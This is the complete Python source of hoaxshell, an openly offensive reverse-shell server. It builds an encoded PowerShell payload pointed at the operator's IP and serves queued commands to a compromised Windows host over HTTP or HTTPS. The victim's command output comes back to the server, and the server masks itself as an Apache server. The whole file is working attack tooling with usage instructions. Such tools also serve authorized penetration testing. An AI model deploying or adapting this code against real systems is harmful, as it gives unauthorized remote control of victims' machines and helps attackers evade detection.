#!/bin/python3
#
# Written by Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, readline, uuid, re
from os import system, path
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep
from ipaddress import ip_address
from subprocess import check_output

filterwarnings("ignore", category = DeprecationWarning)

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(
	formatter_class=argparse.RawTextHelpFormatter,
	epilog='''
Usage examples:

  Basic shell session over http:

      sudo python3 hoaxshell.py -s <your_ip>

  Encrypted shell session (https):

      openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
      sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

'''
	)

parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate. ")
parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https)", type = int)
parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s)", type = float)
parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility")
parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded")
parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (Default: false)")
parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup")

args = parser.parse_args()


def exit_with_msg(msg):
	print(f"[{DEBUG}] {msg}")
	sys.exit(0)


# Check if port is valid.
if args.port:
	if args.port < 1 or args.port > 65535:
		exit_with_msg('Port number is not valid.')

# Check if both cert and key files were provided
if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
	exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')

ssl_support = True if args.certfile and args.keyfile else False

# -------------- General Functions -------------- #
def print_banner():

	padding = '  '

	H = [[' ', '┐', ' ', '┌'], [' ', '├','╫','┤'], [' ', '┘',' ','└']]
	O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	X = [[' ', '─','┐',' ','┬'], [' ', '┌','┴','┬', '┘'], [' ', '┴',' ','└','─']]
	S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
	H = [[' ', '┬',' ','┬'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	E = [[' ', '┌','─','┐'], [' ', '├','┤',' '], [' ', '└','─','┘']]
	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]

	banner = [H,O,A,X,S,H,E,L,L]
	final = []
	print('\r')
	init_color = 36
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{END}{padding}                         by t3l3machus\n')



def promptHelpMsg():
	print(
	'''
	\r  Command                    Description
	\r  -------                    -----------
	\r  help                       Print this message.
	\r  payload                    Print payload again (base64).
	\r  rawpayload                 Print payload again (raw).
	\r  clear                      Clear screen.
	\r  exit/quit/q                Close session and exit.
	''')



def encodePayload(payload):
	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
	print(f'{PLOAD}{enc_payload}{END}')



def is_valid_uuid(value):

    try:
        uuid.UUID(str(value))
        return True

    except ValueError:
        return False



def checkPulse(stop_event):

	while not stop_event.is_set():

		timestamp = int(datetime.now().timestamp())
		tlimit = frequency + 10

		if Hoaxshell.execution_verified:
			if abs(Hoaxshell.last_received - timestamp) > tlimit:
				print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
				Hoaxshell.prompt_ready = True
				stop_event.set()

		sleep(5)



def chill():
	pass


# ------------------ Settings ------------------ #
prompt = "hoaxshell > "
quiet = True if args.quiet else False
frequency = args.frequency if args.frequency else 0.8
stop_event = Event()

def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):

	if Hoaxshell.rst_promt_required or force_rst:
		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
		Hoaxshell.rst_promt_required = False


# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):

	restored = False
	rst_promt_required = False
	prompt_ready = True
	command_pool = []
	execution_verified = False
	last_received = ''
	verify = str(uuid.uuid4()).replace("-", "")[0:8]
	get_cmd = str(uuid.uuid4()).replace("-", "")[0:8]
	post_res = str(uuid.uuid4()).replace("-", "")[0:8]
	output_end = str(uuid.uuid4()).replace("-", "")[0:8]
	hid = str(uuid.uuid4()).split("-")
	header_id = f'{hid[0][0:4]}-{hid[1]}'
	SESSIONID = '-'.join([verify, get_cmd, post_res])


	def do_GET(self):

		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp

		if args.grab and not Hoaxshell.restored:
			header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
			Hoaxshell.header_id = header_id[0]
			session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
			if len(session_id) == 26:
				h = session_id.split('-')
				Hoaxshell.verify = h[0]
				Hoaxshell.get_cmd = h[1]
				Hoaxshell.post_res = h[2]
				Hoaxshell.SESSIONID = session_id
				Hoaxshell.restored = True
				Hoaxshell.execution_verified = True
				session_check = Thread(target = checkPulse, args = (stop_event,))
				session_check.daemon = True
				session_check.start()

				print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
				#Hoaxshell.command_pool.append(f"echo ' ';echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
				Hoaxshell.rst_promt_required = True

		self.server_version = "Apache/2.4.1"
		self.sys_version = ""
		session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# Verify execution
		if self.path == f'/{Hoaxshell.verify}' and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			Hoaxshell.execution_verified = True
			session_check = Thread(target = checkPulse, args = (stop_event,))
			session_check.daemon = True
			session_check.start()
			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}') #end = ''
			Hoaxshell.prompt_ready = False
			Hoaxshell.command_pool.append(f"echo `r;echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
			Hoaxshell.rst_promt_required = True


		# Grab cmd
		if self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()

			if len(Hoaxshell.command_pool):
				cmd = Hoaxshell.command_pool.pop(0)
				self.wfile.write(bytes(cmd, "utf-8"))

			else:
				self.wfile.write(bytes('None', "utf-8"))

			Hoaxshell.last_received = timestamp

		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_POST(self):
		global prompt
		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp
		self.server_version = "Apache/2.4.1"
		self.sys_version = ""
		session_id = self.headers.get(f'X-{Hoaxshell.header_id}')
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# cmd output
		if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:

			self.send_response(200)
			self.send_header('Access-Control-Allow-Origin', '*')
			self.send_header('Content-Type', 'text/plain')
			self.end_headers()
			self.wfile.write(b'OK')
			script = self.headers.get('X-form-script')
			content_len = int(self.headers.get('Content-Length'))
			output = self.rfile.read(content_len)

			if output:
				try:
					bin_output = output.decode('utf-8').split(' ')
					to_b_numbers = [ int(n) for n in bin_output ]
					b_array = bytearray(to_b_numbers)
					output = b_array.decode('utf-8', 'ignore')
					tmp = output.split(Hoaxshell.output_end)
					output = tmp[0]
					prompt = f"PS {tmp[-1].strip()} > "
					prompt = "PS \\ > " if tmp[-1].strip() == '' else prompt

				except UnicodeDecodeError:
					print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

				if isinstance(output, bytes):
					pass

				else:
					output = output.strip() + '\n' if output.strip() != '' else output.strip()

				print(f'\r{GREEN}{output}{END}')
			else:
				print(f'\r{ORANGE}No output.{END}')

			rst_prompt(prompt = prompt)
			Hoaxshell.prompt_ready = True

		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_OPTIONS(self):

		self.server_version = "Apache/2.4.1"
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', f'X-{Hoaxshell.header_id}')
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return


	def dropSession():

		print(f'\r[{WARN}] Closing session elegantly...')
		Hoaxshell.command_pool.append('exit')
		sleep(frequency + 2.0)
		print(f'[{WARN}] Session terminated.')
		stop_event.set()
		sys.exit(0)


	def terminate():

			if Hoaxshell.execution_verified:
				Hoaxshell.dropSession()

			else:
				print(f'\r[{WARN}] Session terminated.')
				stop_event.set()
				sys.exit(0)



def main():

	try:
		chill() if quiet else print_banner()

		# Update utility
		if args.update:

			updated = False

			try:
				cwd = path.dirname(path.abspath(__file__))
				print(f'[{INFO}] Pulling changes from the master branch...')
				u = check_output(f'cd {cwd}&&git pull https://github.com/t3l3machus/hoaxshell main', shell=True).decode('utf-8')

				if re.search('Updating', u):
					print(f'[{INFO}] Update completed! Please, restart hoaxshell.')
					updated = True

				elif re.search('Already up to date', u):
					print(f'[{INFO}] Already running the latest version!')
					pass

				else:
					print(f'[{FAILED}] Something went wrong. Are you running hoaxshell from your local git repository?')
					print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/hoaxshell main" inside the project\'s directory.')

			except:
				print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/hoaxshell main" inside the project\'s directory.')

			if updated:
				sys.exit(0)


		if not args.server_ip and args.update and len(sys.argv) == 2:
			sys.exit(0)

		if not args.server_ip and args.update and len(sys.argv) > 2:
			exit_with_msg('Local host ip not provided (-s)')

		elif not args.server_ip and not args.update:
			exit_with_msg('Local host ip not provided (-s)')

		else:
			# Check if provided ip is valid
			try:
				ip_object = ip_address(args.server_ip)

			except ValueError:
				exit_with_msg('IP address is not valid.')


		if ssl_support:
			server_port = int(args.port) if args.port else 443
		else:
			server_port = int(args.port) if args.port else 8080

		try:
			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)

		except OSError:
			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')

		if ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket,
				keyfile = args.keyfile ,
				certfile = args.certfile ,
				server_side = True,
				ssl_version=ssl.PROTOCOL_TLS
			)

		port = f':{server_port}' if server_port != 443 else ''

		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()


		# Generate payload
		if not args.grab:
			print(f'[{INFO}] Generating reverse shell payload...')
			source = open(f'./https_payload.ps1', 'r') if  ssl_support else open(f'./http_payload.ps1', 'r')
			payload = source.read().strip()
			source.close()
			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
			
			if args.invoke_restmethod:
				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
			
			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')

			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
			print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {server_port}.')
			print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')

		else:
			print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for hoaxshell traffic...')


		# Command prompt
		while True:

			if Hoaxshell.prompt_ready:

				user_input = input(prompt).strip()

				if user_input.lower() == 'help':
					promptHelpMsg()

				elif user_input.lower() in ['clear']:
					system('clear')

				elif user_input.lower() in ['payload']:
					encodePayload(payload)

				elif user_input.lower() in ['rawpayload']:
					print(f'{PLOAD}{payload}{END}')

				elif user_input.lower() in ['exit', 'quit', 'q']:
					Hoaxshell.terminate()

				elif user_input == '':
					rst_prompt(force_rst = True, prompt = '\r')

				else:

					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
						Hoaxshell.command_pool.append(user_input + f";echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
						Hoaxshell.prompt_ready = False

					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
						pass

					else:
						print(f'\r[{INFO}] No active session.')
			# ~ else:
				# ~ sleep(0.5)


	except KeyboardInterrupt:
		Hoaxshell.terminate()


if __name__ == '__main__':
	main()
